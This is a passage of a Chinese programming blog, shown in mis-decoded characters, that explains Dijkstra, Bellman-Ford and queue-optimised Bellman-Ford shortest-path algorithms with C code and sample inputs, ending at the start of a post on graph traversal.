ä¸ºéšæ„å¼•å…¥ä¸€ä¸ªæ–°ç‚¹ï¼Œè·ç¦»éƒ½ä¼šå¤§äºä¸¤ç‚¹ç›´è¾¾\nèƒ½å¤Ÿå‘ç°ï¼Œdis[3]=12ï¼Œè€Œdis[2]+a[2][3]=1+9=10\u0026lt;12ï¼Œé‚£ä¹ˆè¯´æ˜ä»ç‚¹1åˆ°ç‚¹3èƒ½å¤Ÿé€šè¿‡ç‚¹2ä½œä¸ºè·³æ¿ï¼Œç¼©çŸ­è·ç¦»ï¼ˆä¸“ä¸šæœ¯è¯­å«â€œæ¾å¼›â€ï¼‰\né‚£ä¹ˆä»¥é¡¶ç‚¹ 2 ä¸ºè·³æ¿æ¾å¼›è¿‡åï¼Œdisæ•°ç»„ä¸ºï¼š\nå› ä¸ºåˆšåˆšå·²ç»åˆ©ç”¨é¡¶ç‚¹ 2 åšäº†ä¸€æ¬¡è·³æ¿ï¼Œé‚£ä¹ˆå°±ä¸èƒ½å†åˆ©ç”¨é¡¶ç‚¹2äº†ï¼Œè¦å°è¯•ä»¥å…¶ä»–ç‚¹ä¸ºè·³æ¿è¿›è¡Œæ¾å¼›\nä¸Šé¢å¿˜äº†è¯´ï¼Œé€‰è·³æ¿ä¹Ÿæ˜¯æœ‰é¡ºåºçš„ï¼Œåº”è¯¥å…ˆè¿‘åè¿œçš„é¡ºåºï¼ˆä»¥ç¦»ç›®æ ‡ç‚¹æœ€è¿‘çš„å¼€å§‹\nè¿™æ ·æ¥çœ‹ï¼Œä¸‹é¢å°±è¦ä»¥é¡¶ç‚¹4ä¸ºè·³æ¿è¿›è¡Œæ¾å¼›\nå¯ä»¥çœ‹åˆ° dis[3]=10 \u0026lt; dis[4]+a[4][3]=8\né‚£ä¹ˆ dis[3]çš„å€¼æ›´æ–°ä¸ºäº†8ï¼Œåˆå› ä¸ºé¡¶ç‚¹4åˆå¯¹é¡¶ç‚¹5ã€6æœ‰å‡ºè¾¹ï¼Œå› æ­¤é¡¶ç‚¹5ã€6ä¹Ÿæ›´æ–°äº†ä¼°è®¡å€¼\nä¸ºäº†åŒºåˆ†ç¡®åˆ‡å€¼å’Œä¼°è®¡å€¼ï¼Œç”¨äº†é¢œè‰²åŒºåˆ†ï¼Œæ©™è‰²ä»£è¡¨ç¡®åˆ‡å€¼ğŸ‘‡\nä½•æ—¶ä¸ºç¡®åˆ‡ï¼Ÿä½•æ—¶ä¸ºä¼°è®¡ï¼Ÿï¼š\nç”±äºè·³æ¿çš„é€‰æ‹©é¡ºåºæ˜¯ç”±è¿‘åŠè¿œçš„ï¼Œé‚£ä¹ˆè·³æ¿çš„ç›´è¾¾è·ç¦»è‚¯å®šæ˜¯ä¸¤ç‚¹ä¹‹é—´æœ€çŸ­çš„\nå…·ä½“è¯·ä»¥æœ€å¼€å§‹çš„é‚£ä¸ªdisæ•°ç»„å›¾ä¸ºä¾‹å­ï¼Œé¡¶ç‚¹ 1èƒ½ç›´è¾¾çš„ç‚¹åªæœ‰é¡¶ç‚¹2ã€3ã€4ï¼Œå…¶ä¸­åˆ°é¡¶ç‚¹ 2çš„è·ç¦»åˆæ˜¯æœ€çŸ­çš„ï¼ˆçŸ­äºç‚¹1åˆ°ç‚¹3ã€4çš„ç›´è¾¾è·ç¦»ï¼‰ï¼Œé‚£ä¹ˆè¿™æ—¶å°±æœ‰å¯èƒ½ç»è¿‡é¡¶ç‚¹ 2ï¼Œä½¿å¾—ä»ç‚¹1åˆ°å…¶ä»–ç‚¹çš„è·¯å¾„ç¼©çŸ­\nå› ä¸ºç‚¹1åˆ°ç‚¹2çš„ç›´è¾¾è·ç¦»æ˜¯æœ€çŸ­çš„ï¼Œå°±ä¸å¯èƒ½é€šè¿‡å…¶ä»–ç‚¹åšè·³æ¿ç¼©çŸ­è·ç¦»å’¯ï¼ˆä¸‰è§’å½¢çš„ä¸¤è¾¹å¤§äºç¬¬ä¸‰è¾¹ğŸ˜›ï¼‰é‚£ä¹ˆè¿™æ—¶åˆ°ç‚¹ 2 çš„è·ç¦»å°±æˆä¸ºäº†ç¡®åˆ‡å€¼ï¼Œå…¶ä»–æ²¡æœ‰åšè¿‡è·³æ¿çš„ä»ç„¶ä¸ºä¼°è®¡å€¼\nä¸ºä½•ä¸ç”±è¿œåŠè¿‘é€‰å–è·³æ¿ï¼Ÿ ç­”ï¼šå°‘åšæ— ç”¨åŠŸ\nè¿‡ç¨‹ç®€è¨€ä¹‹ï¼šæ¯æ¬¡æ‰¾ç¦»æºç‚¹æœ€è¿‘çš„ä¸€ä¸ªç‚¹ï¼Œç„¶åä»¥ç‚¹ä¸ºè·³æ¿æ‰©æ•£ï¼Œä½œä¸ºè·³æ¿çš„ç‚¹ä¸€å®šæ˜¯ä¸ç›®æ ‡ç‚¹ä¸¤ç‚¹ä¹‹é—´ç›´è¾¾æœ€è¿‘çš„\né‚£ä¹ˆä¸‹é¢æŒ‰ç…§è·ç¦»ï¼Œä»¥é¡¶ç‚¹ 3ä¸ºè·³æ¿ï¼Œå¾—åˆ°ä¸‹å›¾ğŸ‘‡\nå†ä»¥é¡¶ç‚¹ 5ä¸ºè·³æ¿ï¼Œå¾—åˆ°ä¸‹å›¾ğŸ‘‡\né‚£ä¹ˆæœ€ååˆ°è¦ä½¿ç”¨é¡¶ç‚¹ 6 ä¸ºè·³æ¿ï¼Œä¸è¿‡å› ä¸ºåœ¨å•å‘å›¾ä¸­ï¼Œé¡¶ç‚¹ 6ï¼Œå¹¶æ²¡æœ‰å‡ºè¾¹ï¼Œä»£å…¥ç®—æ³•åä»–è‡ªèº«å°±æ˜¯ç¡®åˆ‡å€¼\nå°æ€»ç»“ï¼šDijkstraç®—æ³•æ˜¯å•æºçš„ï¼ˆä»ä¸€å›ºå®šç‚¹åˆ°å…¶ä½™ç‚¹ï¼‰ï¼Œé‚£ä¹ˆåœ¨å‚¨å­˜å›¾çš„æ—¶å€™è¦è¿›è¡Œæ¨¡ç³Šå¤„ç†ï¼Œèƒ½ç›´è¾¾çš„å‚¨å­˜ç›´è¾¾è·ç¦»ï¼Œä¸èƒ½ç›´è¾¾çš„å°±æ¨¡ç³Šå¤„ç†ä¸ºæ­£æ— ç©·è¿œï¼Œå¹¶åœ¨æºç‚¹èƒ½ç›´è¾¾çš„ç‚¹ä¸­æŒ‰ç…§ç”±è¿‘åŠè¿œçš„é¡ºåºé€‰å–è·³æ¿ï¼Œåˆ©ç”¨è·³æ¿æ¥å°è¯•ç¼©çŸ­æºç‚¹åˆ°å…¶ä½™ç‚¹çš„è·ç¦»ã€‚è·³æ¿æ˜¯é™¤å¼€æºç‚¹ï¼Œæ¯ä¸€ä¸ªç‚¹éƒ½è¦åšä¸€éçš„ã€‚\nOkï¼Œç®—æ³•çš„æ€è·¯å°±è®²åˆ°è¿™é‡Œï¼Œä¸‹é¢æ˜¯ä»£ç å®ç°ğŸ‘‡ï¼š\n#include\u0026lt;stdio.h\u0026gt;\tint a[51][51];\rint n, m;\rint dis[51];\rint book[51];\rint main()\r{\rint inf = 99999999;//è®¾ç½®infä¸ºæ­£æ— ç©·å¤§\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m);\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rfor (int j = 1; j \u0026lt;= n; j++)\r{\rif (i == j)\ra[i][j] = 0;\relse\ra[i][j] = inf;//æ¨¡ç³Šå¤„ç†ä¸ºæ— é™è¿œï¼Œå³ä¸å¯åˆ°è¾¾\r}\r}//åˆå§‹åŒ–å›¾\rfor (int i = 1; i \u0026lt;= m; i++)\r{\rint x, y, d;\rscanf_s(\u0026#34;%d %d %d\u0026#34;, \u0026amp;x, \u0026amp;y, \u0026amp;d);\ra[x][y] = d;//å•å‘å›¾å†™æ³•\r}\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rdis[i] = a[1][i];//é¡¶ç‚¹1åˆ°ä¸ªç‚¹çš„è·ç¦»ç”¨æ•°ç»„å‚¨å­˜èµ·æ¥\r}\rbook[1] = 1;\rint turning=1;//è¿™é‡Œçš„æ•°å€¼æ— æ‰€è°“ï¼Œåæ­£ä¸‹é¢é€‰å–è·³æ¿æ—¶ä¼šæ›´æ–°\r//ä¸‹é¢ä¸ºDijkstraæ ¸å¿ƒç®—æ³•\rfor (int i = 1; i \u0026lt;= n-1; i++)//æ³¨æ„æ˜¯åˆ°n-1ï¼Œå³é™¤äº†æºç‚¹ï¼Œå…¶ä½™ç‚¹éƒ½è¦åšä¸€æ¬¡è·³æ¿\r{\rint min = inf;\rfor (int j = 1; j \u0026lt;= n; j++)\r{\rif (book[j] == 0 \u0026amp;\u0026amp; dis[j] \u0026lt; min)\r{\rmin = dis[j];\rturning = j;\r}\r}//æ¯æ¬¡æ‰¾åˆ°ç¦»é¡¶ç‚¹1æœ€è¿‘çš„é‚£ä¸ªç‚¹ï¼Œå³turningï¼Œä¸‹é¢è¦å°è¯•ä»¥turningä¸ºè·³æ¿å¼•å…¥\rbook[turning] = 1;\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rif (a[turning][i] \u0026lt; inf)//å‡è®¾turningåˆ°ç‚¹iç›´çº¿å¯è¾¾\r{\rif (dis[i] \u0026gt; dis[turning] + a[turning][i])\r{\rdis[i] = dis[turning] + a[turning][i];\r}\r}\r}\r}\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rprintf(\u0026#34;%d \u0026#34;, dis[i]);\r}\rreturn 0;\r} å¯ä»¥è¾“å…¥æ•°æ®è¿›è¡ŒéªŒè¯ï¼š\n6 9\r1 2 1\r1 3 12\r2 3 9\r2 4 3\r3 5 5\r4 3 4\r4 5 13\r4 6 15\r5 6 4\rè¿è¡Œç»“æœï¼š0 1 8 4 13 17 ç¼ºç‚¹ï¼šDijkstraç®—æ³•æ˜¯ä¸èƒ½è§£å†³å¸¦æœ‰è´Ÿæƒè¾¹çš„å›¾çš„\nåŸå› çœ‹ä¸‹é¢çš„å›¾ğŸ‘‡ï¼š\nå¦‚æœæ˜¯å›¾1 çš„æƒ…å†µï¼Œé¦–å…ˆé¡¶ç‚¹ 0ï¼Œåˆ°é¡¶ç‚¹1ã€2èƒ½ç›´è¾¾æœ‰è·ç¦»ï¼Œä¸”ç‚¹0â†’ç‚¹2çš„è·ç¦»æ˜¯æœ€çŸ­çš„ï¼Œé‚£ä¹ˆæ ¹æ®ç®—æ³•ï¼Œç‚¹0â†’2è¿™æ¡çº¿å°±åº”è¯¥æ˜¯ç¡®åˆ‡çš„ï¼Œç‚¹2åˆæ²¡æœ‰å‡ºè¾¹ï¼Œé‚£ä¹ˆç‚¹2å°±åšä¸äº†è·³æ¿è¢«å¿½ç•¥ï¼Œå°±è¯¥è½®åˆ°ç‚¹1åšè·³æ¿ï¼Œä½†æ˜¯å¼•å…¥ç‚¹1åï¼Œåˆä¼šä½¿å¾—åŸæœ¬æ˜¯ç¡®åˆ‡å€¼çš„ç‚¹0â†’2 æ”¹å˜ï¼Œè¿™å°±ä¸ç®—æ³•é€»è¾‘çŸ›ç›¾ï¼Œè¿™ä»…æ˜¯ä¸‰ä¸ªç‚¹ï¼Œç‚¹å¤šäº†å°±ä¼šå‡ºç°æ›´å¤šé”™è¯¯\nåœ¨æ—¶é—´å¤æ‚åº¦ä¸Šï¼Œå¯ä»¥ä½¿ç”¨ä¸‰ä¸ªä¸€ç»´æ•°ç»„å®ç°é‚»æ¥è¡¨æ¥ä»£æ›¿äºŒç»´çš„é‚»æ¥çŸ©é˜µï¼Œè¿™æ ·ä¼šä½¿è¿è¡Œé€Ÿåº¦å¿«ä¸€äº›\né‚»æ¥è¡¨çš„å®ç°æ–¹å¼ğŸ‘‡ï¼š\nint n, m, i;\rint u[6], v[6], w[6];//ä¸¤ç‚¹åŠå…¶è·ç¦»\rint first[5], next[5];//firstè¦å¤§äºnçš„æœ€å¤§å€¼ï¼Œnextè¦å¤§äºmçš„æœ€å¤§å€¼\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m);\rfor (int i = 1; i \u0026lt;= n; i++)\rfirst[i] = -1;//è®¾ç½®æˆæ— æ³•å¼•ç”¨çš„ä¸‹æ ‡\rfor (int i = 1; i \u0026lt;= m; i++)//å¯¹æ¯ä¸€æ¡è¾¹è¿›è¡Œå½•å…¥\r{\rscanf_s(\u0026#34;%d %d %d\u0026#34;, \u0026amp;u[i], \u0026amp;v[i], \u0026amp;w[i]);\rnext[i] = first[u[i]];\rfirst[u[i]] = i;//è¿™ä¸¤æ­¥è‡³å…³é‡è¦\r} ä»¥é‚»æ¥è¡¨æ–¹å¼å‚¨å­˜ï¼Œåå‚¨å­˜çš„è¾¹ä¼šåœ¨å…ˆå‚¨å­˜çš„è¾¹ä¸Šé¢ï¼Œå³æ›´å…ˆè®¿é—®åˆ°åå‚¨å­˜çš„ç‚¹å’Œè¾¹\nfirst[u[i]]ä¿å­˜é¡¶ç‚¹ä¸ºu[i]çš„ç¬¬ä¸€æ¡è¾¹ï¼ˆæœ€æ–°çš„é‚£æ¡ï¼‰ï¼Œnext[i]ç”¨äºå‚¨å­˜ç¬¬ä¸€æ¡è¾¹åé¢çš„è¾¹\nä»¥è¿™æ ·çš„æ–¹å¼è®¿é—®ğŸ‘‡ï¼Œæ¯”å¦‚è¯´æ‰¾åˆ°1å·é¡¶ç‚¹çš„ç¬¬ä¸€æ¡è¾¹ï¼ˆå…¶å®æ˜¯æœ€åè¾“å…¥çš„ï¼‰ï¼Œå‰©ä¸‹çš„è¾¹éƒ½å¯ä»¥åœ¨nextæ•°ç»„é‡Œæ‰¾åˆ°\nfor (int i = 1; i \u0026lt;= n; i++) {\rk = first[1];\rwhile (k != -1)\r{\rprintf(\u0026#34;%d %d %d\u0026#34;, u[i], v[i], w[i]);\rk = next[k];\r}\r} å‡å¦‚è¾“å…¥ä»¥ä¸‹æ•°æ®éªŒè¯ï¼š\n4 5\r1 4 9\r4 3 8\r1 2 5\r2 4 6\r1 3 7 é‚£ä¹ˆæ‰¾åˆ°é¡¶ç‚¹1çš„ç¬¬ä¸€æ¡è¾¹ä¹‹åï¼Œå‰©ä½™çš„è¾¹éƒ½å¯ä»¥åœ¨nextæ•°ç»„é‡Œæ‰¾åˆ°\né‚»æ¥è¡¨æœ‰ç‚¹æŠ½è±¡å“ˆï¼Œå†ç¢ç£¨ç¢ç£¨è¿™ä¸ªä¸œè¥¿å§ğŸ˜©\nBellman-Ford #\rè¿™æ˜¯ä¸€ä¸ªæ— è®ºæ˜¯æ€æƒ³è¿˜æ˜¯ä»£ç å®ç°ï¼Œéƒ½å ªç§°å®Œç¾çš„æœ€çŸ­è·¯å¾„ç®—æ³•ï¼ğŸ˜¬\nèƒ½è§£å†³Dijkstraç®—æ³•ç”±äºä»£ç é€»è¾‘é€ æˆçš„è´Ÿæƒè¾¹é—®é¢˜ï¼\nä¸è¿‡ä»ç„¶æ˜¯å•æº\næ ¸å¿ƒä»£ç åªæœ‰å››è¡ŒğŸ‘‡ï¼š\nfor (int k = 1; k \u0026lt;= n - 1; k++)\rfor (int i = 1; i \u0026lt;= m; i++)\rif (dis[v[i]] \u0026gt; dis[u[i]] + w[i])\rdis[v[i]] = dis[u[i]] + w[i]; æ€æƒ³è¿˜æ˜¯è¦å€ŸåŠ©**è·³æ¿**\nä¸è¿‡è¿™é‡Œç®—æ³•æ›´æ³¨é‡çš„æ˜¯è¾¹ï¼Œè€Œä¸æ˜¯ç‚¹\nå¼€ä¸‰ä¸ªæ•°ç»„ä¸ºUã€Vã€Wï¼Œåˆ†åˆ«å‚¨å­˜èµ·ç‚¹ã€ç»ˆç‚¹ã€è¾¹é•¿\næ ¸å¿ƒä»£ç å¯ä»¥ç†è§£ä¸ºæ ¹æ® ä¸‰è§’å½¢çš„ä¸¤è¾¹ä¹‹å’Œå¤§äºç¬¬ä¸‰è¾¹ ï¼Œæ¥ç¼©çŸ­è·ç¦»\nå¯¹äºæ ¸å¿ƒä»£ç å¾ªç¯ä¸­çš„ Kï¼Œæˆ‘çš„ç†è§£è¿˜æ˜¯ä½œä¸ºè·³æ¿ï¼ˆèµ„æ–™ä¸Šè§£é‡Šçš„æ˜¯ï¼šnä¸ªç‚¹ä¹‹é—´æœ€å¤šæœ‰n-1æ¡å•å‘è¾¹ï¼Œè¦è¿›è¡Œn-1æ¬¡å¾ªç¯æ¥å¯¹æ¯æ¡è¾¹è¿›è¡Œæ¾å¼›ï¼‰ï¼Œå› ä¸ºä¸€å®šè¦ä¸‰ä¸ªç‚¹æ‰èƒ½å½¢æˆä¸‰è§’å½¢å˜›\næ¯å®æ–½ä¸€æ¬¡æ¾å¼›æ“ä½œï¼Œéƒ½ä¼šæœ‰ä¸€äº›é¡¶ç‚¹æ±‚å¾—å…¶æœ€çŸ­è·¯å¾„ï¼Œå˜ä¸ºç¡®åˆ‡å€¼ï¼Œæœ€åçš„æƒ…å†µå°±æ˜¯è¿›è¡Œäº†n-1æ¬¡æ¾å¼›è¿‡åæ‰ä½¿æ‰€æœ‰ç‚¹å®Œæˆæ¾å¼›\nå…·ä½“ä»£ç å¦‚ä¸‹ğŸ‘‡ï¼š\n#include\u0026lt;stdio.h\u0026gt;\tint dis[10];\rint u[10];\rint v[10];\rint w[10];\rint n, m;\rint inf = 99999999;\rint main()\r{\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m);\rfor (int i = 1; i \u0026lt;= m; i++)\r{\rscanf_s(\u0026#34;%d %d %d\u0026#34;, \u0026amp;u[i], \u0026amp;v[i], \u0026amp;w[i]);//å‚¨å­˜ä¸¤ç‚¹ä»¥åŠè·ç¦»\r}\rfor (int i = 1; i \u0026lt;= n; i++)\rdis[i] = inf;//åˆæ­¥è®¾ç½®ä¸ºæ— é™è¿œ\rdis[1] = 0;\rfor (int i = 1; i \u0026lt;= n - 1; i++)\r{\rfor (int j = 1; j \u0026lt;= m; j++)\r{\rif (dis[v[j]] \u0026gt; dis[u[j]] + w[j])\rdis[v[j]] = dis[u[j]] + w[j];\r}\r}\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rprintf(\u0026#34;%d \u0026#34;, dis[i]);\r}\rreturn 0;\r} å¯ä»¥è¾“å…¥æ•°æ®éªŒè¯ï¼š\n5 5 2 3 2\r1 2 -3\r1 5 5\r4 5 2\r3 4 3\rè¿è¡Œç»“æœï¼š0 -3 -1 2 4 è¿™ç§ç®—æ³•è™½ç„¶ç²¾ç®€ï¼Œæ—¶é—´å¤æ‚åº¦å´æ˜¯è¦æ¯”Dijkstraè¦é«˜çš„ï¼ˆçœåŠ›ä¸çœæ—¶ç½¢ï¼‰ï¼Œä¸è¿‡ä¹Ÿæ˜¯å¯ä»¥è¿›è¡Œä¼˜åŒ–\nä¸Šé¢è¯´åˆ°ï¼Œæœ€åçš„æƒ…å†µå°±æ˜¯å¯¹n-1æ¡è¾¹è¿›è¡Œæ¾å¼›ï¼Œé‚£ä¹ˆä¹Ÿå¯èƒ½æ²¡æœ‰é‚£ä¹ˆå¤šè¾¹\nå¯ä»¥ç®€å•åœ°åœ¨å¾ªç¯ä¸­æ’å…¥ä¸€ä¸ªcheckå˜é‡ï¼ŒæŸ¥çœ‹æ˜¯å¦è¿›è¡Œè¿‡æ¾å¼›ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå°±ç›´æ¥ç»“æŸç®—æ³•ï¼Œé¿å…å¤šä½™çš„å¾ªç¯\nè¦æ£€æµ‹ä¸€ä¸ªå›¾æ˜¯å¦å«æœ‰è´Ÿæƒå›è·¯ï¼Œé‚£ä¹ˆåªéœ€è¦åœ¨æ‰€æœ‰è¾¹å®Œå…¨æ¾å¼›è¿‡åï¼Œå†éå†ä¸€æ¬¡disæ•°ç»„ï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨â€œä¸‰è§’å½¢çš„æ–œè¾¹å¤§äºå¦å¤–ä¸¤è¾¹ä¹‹å’Œâ€çš„æƒ…å†µ\nä¾‹å¦‚ğŸ‘‡ï¼š\nfor (int i = 1; i \u0026lt;= n - 1; i++)\r{\rfor (int j = 1; j \u0026lt;= m; j++)\r{\rif (dis[v[j]] \u0026gt; dis[u[j]] + w[j])\r{\rdis[v[j]] = dis[u[j]] + w[j];\r}\r}\r}\rfor (int i = 1; i \u0026lt;= m; i++)\r{\rif (dis[v[i]] \u0026gt; dis[u[i]] + w[i])\rprintf(\u0026#34;å«æœ‰è´Ÿæƒå›è·¯\u0026#34;);\r} æ€è€ƒä¸€ä¸‹ï¼šä¸Šé¢è¯´è¿‡ï¼Œåœ¨è¿›è¡Œæ¾å¼›çš„è¿‡ç¨‹ä¸­ï¼Œä¼šæœ‰ä¸€äº›è¾¹å˜ä¸ºç¡®åˆ‡å€¼ï¼Œè¿™äº›ç¡®åˆ‡å€¼æ˜¯ä¸ä¼šæ”¹å˜çš„ï¼Œä½†æ˜¯åœ¨åç»­æ¾å¼›çš„è¿‡ç¨‹ä¸­è¿˜æ˜¯ä¼šå¯¹å·²ç¡®å®šçš„è¾¹è¿›è¡Œåˆ¤æ–­ï¼Œé‚£ä¹ˆè¿™é‡Œå°±ä¼šæµªè´¹æ—¶é—´ã€‚é‚£ä¹ˆæ˜¯å¦å¯ä»¥è€ƒè™‘æ¯æ¬¡ä»…å¯¹ä¼°è®¡å€¼å˜åŒ–çš„é¡¶ç‚¹çš„å‡ºè¾¹è¿›è¡Œæ¾å¼›æ“ä½œå‘¢ï¼Ÿ\nBellman-Fordçš„é˜Ÿåˆ—ä¼˜åŒ– #\råœ¨ä¸Šä¸€éƒ¨åˆ†ç®€è¿°BFç®—æ³•çš„æ—¶å€™ç•™ä¸‹äº†ä¸€ä¸ªæ€è€ƒ\nåœ¨è¿™é‡Œå±•å¼€è¯´æ˜ä¸€ä¸‹\nçœ‹æ ‡é¢˜åå­—å°±çŸ¥é“ï¼Œå’Œé˜Ÿåˆ—çŸ¥è¯†ç¦»ä¸å¼€\nä¼˜åŒ–åçš„æ•ˆæœå¤§è‡´å¦‚ä¸‹ï¼š\næ¯æ¬¡é€‰å–é˜Ÿåˆ—çš„é¦–é¡¶ç‚¹uï¼Œå¯¹uç‚¹çš„æ‰€æœ‰å‡ºè¾¹è¿›è¡Œæ¾å¼›æ“ä½œï¼Œä¾‹å¦‚æœ‰ä¸€æ¡uâ†’vçš„è¾¹ï¼Œå¦‚æœè¿™æ¡è¾¹ä½¿å¾—æºç‚¹åˆ°vç‚¹çš„è·ç¦»èƒ½ç¼©çŸ­ï¼Œä¸”vç‚¹ä¸åœ¨é˜Ÿåˆ—ä¸­ï¼Œå°±å°†vç‚¹åŠ å…¥é˜Ÿå°¾ã€‚å°†uç‚¹çš„æ‰€æœ‰å‡ºè¾¹è¿›è¡Œæ¾å¼›è¿‡åï¼Œå°±å°†uç‚¹å‡ºåˆ—ï¼Œå¯¹é˜Ÿåˆ—ä¸­åé¢çš„ç‚¹ç»§ç»­è¿›è¡ŒåŒæ ·æ“ä½œã€‚\nä¸‹é¢æ˜¯ä»£ç å®ç°ï¼Œå°è¯•ç”¨é‚»æ¥è¡¨æ¥å‚¨å­˜å›¾ğŸ‘‡ï¼š\n#include\u0026lt;stdio.h\u0026gt;\tint dis[6];\rint u[8],v[8],w[8];//æ ¹æ®å®é™…æƒ…å†µè®¾ç½®ï¼Œè¦æ¯”må¤§1\rint first[6], next[8];//firstæ˜¯å‚¨å­˜ç‚¹çš„ï¼Œnextæ˜¯å‚¨å­˜è¾¹çš„ï¼Œfirstè¦æ¯”nå¤§1ï¼Œnextè¦æ¯”må¤§1\rint book[6];//ç”¨äºæ ‡è®°\rint que[1001];\rint head = 1, tail = 1;//è®¾ç½®é˜Ÿåˆ—\rint inf = 99999999;\rint main()\r{\rint n, m;\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m);\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rdis[i] = inf;\r}\rdis[1] = 0;\rfor (int i = 1; i \u0026lt;= n; i++)\rfirst[i] = -1;\rfor (int i = 1; i \u0026lt;= n; i++)\rbook[i] = 0;\rfor (int i = 1; i \u0026lt;= m; i++)\r{\rscanf_s(\u0026#34;%d %d %d\u0026#34;, \u0026amp;u[i], \u0026amp;v[i], \u0026amp;w[i]);\r//é‚»æ¥è¡¨\rnext[i] = first[u[i]];\rfirst[u[i]] = i;\r}\rque[tail] = 1;\rtail++;\rbook[1] = 1;\rwhile (head \u0026lt; tail)\r{\rint k = first[que[head]];//æ³¨æ„kæ˜¯é¡¶ç‚¹ä¸ºque[head]çš„ç¬¬ä¸€æ¡è¾¹\rwhile (k != -1)//å…ˆå¯¹ä¸€ä¸ªç‚¹çš„æ‰€æœ‰å‡ºè¾¹è¿›è¡Œæ¾å¼›\r{\rif (dis[v[k]] \u0026gt; dis[u[k]] + w[k])\r{\rdis[v[k]] = dis[u[k]] + w[k];//æ›´æ–°è·ç¦»\rif (book[v[k]] == 0)//0è¡¨ç¤ºè¾¹çš„ç¼–å·ä¸åœ¨é˜Ÿåˆ—ä¸­ï¼ŒæŠŠv[k]é¡¶ç‚¹å…¥é˜Ÿ\r{\rque[tail] = v[k];\rtail++;\rbook[v[k]] = 1;\r}\r}\rk = next[k];\r}\rbook[que[head]] = 0;//è¾¹å‡ºé˜Ÿï¼Œå¹¶é‡ç½®ä¸º0ï¼Œå› ä¸ºå…¶ä»–ç‚¹å¯èƒ½ä¼šç”¨åˆ°\rhead++;\r}\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rprintf(\u0026#34;%d \u0026#34;, dis[i]);\r}\rreturn 0;\r} å…³é”®å°±åœ¨äºè¦æœ‰ä¸€ä¸ªæ•°ç»„æ¥åˆ¤æ–­é‡å¤ï¼Œå³ä¸Šé¢çš„book\nå› ä¸ºåŒä¸€ä¸ªé¡¶ç‚¹åœ¨é˜Ÿåˆ—ä¸­å¤šæ¬¡å‡ºç°æ˜¯æ¯«æ— æ„ä¹‰çš„ï¼Œé‚£æ ·å°±ç›¸å½“äºBellman-Fordæ²¡ä¼˜åŒ–äº†ã€‚ã€‚ã€‚\n**æ€»ç»“ä¸€ä¸‹ï¼š**é˜Ÿåˆ—ä¼˜åŒ–è¿‡åçš„BFç®—æ³•ï¼Œå…¶å®å’Œå¹¿åº¦ä¼˜å…ˆæœç´¢æ–¹å¼ååˆ†ç±»ä¼¼ï¼Œå·®å¼‚å°±æ˜¯ä¼˜åŒ–è¿‡åçš„ç‚¹å‡ºåˆ—åå¯èƒ½ä¼šå†æ¬¡å…¥åˆ—ï¼Œè¿™æ˜¯å¹¿åº¦ä¼˜å…ˆä¸å…·å¤‡çš„ã€‚\nå¦‚ä½•åˆ¤æ–­æ˜¯å¦æœ‰è´Ÿç¯ï¼šå¦‚æœä¸€ä¸ªç‚¹å…¥åˆ—çš„æ¬¡æ•°è¶…è¿‡næ¬¡ï¼Œé‚£ä¹ˆè‚¯å®šå­˜åœ¨è´Ÿç¯ï¼Œå› ä¸ºç»è¿‡è´Ÿæƒè¾¹æ€»èƒ½ä½¿å¾—è·ç¦»å˜çŸ­\næœ€çŸ­è·¯å¾„çš„é—®é¢˜å°±å…ˆå­¦ä¹ åˆ°è¿™é‡Œï¼Œåé¢æœ‰æœºä¼šå†å­¦ä¹ ä¸€ä¸‹å…¶ä»–çš„ç®—æ³•ğŸ˜©\n","date":"2023-07-17","externalUrl":null,"permalink":"/posts/2023/07/shortest-path-problem/","section":"Posts","summary":"","title":"æœ€çŸ­è·¯å¾„é—®é¢˜","type":"posts"},{"content":"\ræ·±åº¦å’Œå¹¿åº¦ä¼˜å…ˆæ˜¯ä»€ä¹ˆï¼Ÿ #\rä¹‹å‰å­¦ä¹ è¿‡æ·±åº¦å’Œå¹¿åº¦ä¼˜å…ˆæœç´¢\nå®é™…ä¸Šæ·±åº¦å’Œå¹¿åº¦éƒ½æ˜¯é’ˆå¯¹å›¾çš„éå†è€Œè¨€çš„\nä»€ä¹ˆæ˜¯å›¾ï¼Ÿ\nè¯·çœ‹ä¸‹å›¾ï¼Œè¿™æ˜¯ä¸€ä¸ªç®€å•çš„æœ‰å‘å›¾ğŸ‘‡\nä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„æ— å‘å›¾ğŸ‘‡\nç®€å•çš„è¯´ï¼Œå›¾å°±æ˜¯ç”±é¡¶ç‚¹å’Œè¾¹ç»„æˆçš„ï¼Œåœ¨å­¦ç¦»æ•£æ•°å­¦çš„æ—¶å€™ä¹Ÿæ¶‰åŠåˆ°äº†å›¾è®ºçš„ç›¸å…³çŸ¥è¯†\né‚£ä¹ˆä½¿ç”¨æ·±åº¦ä¼˜å…ˆæœç´¢æ¥éå†ä¸Šé¢è¿™ä¸ªæ— å‘å›¾ï¼Œå¾—åˆ°çš„é¡ºåºå°±æ˜¯ç›¸åº”çš„å›¾ä¸­çº¢å­—ï¼ˆæ—¶é—´æˆ³\nä¸‹é¢å°±è¿™ä¸ªæ— å‘å›¾å†æ¥ç†è§£ä¸€ä¸‹\næ·±åº¦ä¼˜å…ˆçš„å…·ä½“è¿‡ç¨‹ #\ré¦–å…ˆä»¥ä¸€ä¸ªä¸ºèµ°è¿‡çš„é¡¶ç‚¹ä½œä¸ºèµ·å§‹ç‚¹ï¼ˆ1å·ï¼Œæ²¿ç€èµ·å§‹ç‚¹å»è®¿é—®å…¶ä»–ä¸ºèµ°è¿‡çš„é¡¶ç‚¹ï¼Œå…ˆå‘ç°é¡¶ç‚¹ 2ï¼Œé‚£ä¹ˆå†ä»¥é¡¶ç‚¹ 2ï¼Œä¸ºèµ·å§‹ç‚¹å†å»è®¿é—®é¡¶ç‚¹ 2 